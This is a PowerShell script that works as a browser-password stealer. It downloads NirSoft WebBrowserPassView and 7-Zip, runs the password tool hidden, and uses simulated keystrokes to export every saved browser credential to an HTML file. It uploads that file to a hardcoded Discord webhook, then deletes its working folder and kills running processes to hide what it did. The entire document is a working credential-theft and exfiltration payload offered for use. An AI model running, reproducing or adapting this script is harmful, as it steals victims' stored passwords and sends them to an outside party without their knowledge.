$tmpfolder = "C:\temp"

if (Test-Path $tmpfolder) { 
    Remove-Item $tmpfolder -Recurse -Force 
}

mkdir $tmpfolder
Set-Location $tmpfolder

Start-Sleep -Seconds 3

$wbpvUrl = 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip'
$wbpvZip = 'wbpv.zip'
$sevenZipUrl = 'https://www.7-zip.org/a/7za920.zip'
$sevenZipZip = '7z.zip'
$extractionPassword = 'wbpv28821@'
$webhookUrl = 'https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX'
$filePath = 'C:\temp\export.htm'

$refererHeader = @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'}
Invoke-WebRequest -Headers $refererHeader -Uri $wbpvUrl -OutFile $wbpvZip
Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipZip

Start-Sleep -Seconds 5

Expand-Archive -Path $sevenZipZip -DestinationPath '7z'

$sevenZipPath = '.\7z\7za.exe'
$extractionArgs = "e", $wbpvZip, "-p$extractionPassword"

# Extract the zip file using 7-Zip
Start-Process -FilePath $sevenZipPath -ArgumentList $extractionArgs -Wait

# Start WebBrowserPassView in hidden mode
Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden

# Load the Windows Forms assembly for SendKeys functionality
Add-Type -AssemblyName System.Windows.Forms

# Allow time for the application to load
Start-Sleep -Seconds 3

# Simulate keyboard input to select all and save the file
[System.Windows.Forms.SendKeys]::SendWait('^a')  # CTRL + A
[System.Windows.Forms.SendKeys]::SendWait('^s')  # CTRL + S

# Allow time for the save dialog to appear
Start-Sleep -Seconds 1

# Specify the filename and navigate to save
[System.Windows.Forms.SendKeys]::SendWait('export.html')
[System.Windows.Forms.SendKeys]::SendWait('{TAB}')  # Navigate to the Save button
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')  # Press Enter to save

Start-Sleep -Seconds 3

$file = Get-Item $filePath
$webhookUrl = "https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX"
Invoke-RestMethod -Uri $webhookUrl -Method Post -Form @{ file1 = $file }

Remove-Item -Recurse -Force 'C:\temp\*'
TASKKILL /IM "7z.exe" -ErrorAction SilentlyContinue
TASKKILL /IM "7za.exe" -ErrorAction SilentlyContinue
TASKKILL /IM "powershell.exe" -ErrorAction SilentlyContinue
